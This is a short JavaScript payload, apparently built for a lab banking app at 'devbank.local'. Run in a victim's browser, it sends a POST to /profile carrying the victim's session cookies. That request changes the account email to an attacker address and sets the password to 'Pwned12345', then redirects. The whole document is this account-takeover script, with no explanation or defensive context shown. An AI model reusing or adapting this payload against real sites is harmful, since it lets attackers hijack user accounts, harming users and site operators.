(function () {
  const newEmail = "attacker@devbank.local";
  const newPassword = "Pwned12345";

  fetch("/profile", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body:
      "email=" + encodeURIComponent(newEmail) +
      "&password=" + encodeURIComponent(newPassword)
  })
    .then(function () {
      window.location = "/profile";
    });
})();
